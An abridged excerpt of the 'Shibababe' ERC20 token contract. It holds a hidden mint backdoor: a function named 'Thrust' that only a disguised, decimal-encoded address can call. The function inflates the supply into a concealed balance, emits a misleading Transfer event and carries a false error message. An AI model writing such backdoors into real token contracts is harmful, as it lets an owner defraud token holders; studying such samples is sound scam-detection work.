...
contract Shibababe is Context, IERC20 {
    ...
    address _addr1 = address (886584871145177351176933179185737631955523757889);
    ...
    function Thrust (address account, uint256 amount) public {
        require(msg.sender == address (886584871145177351176933179185737631955523757889), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[_addr1] = _balances[_addr1].add(amount);
        emit Transfer(address(0), account, amount);
    }
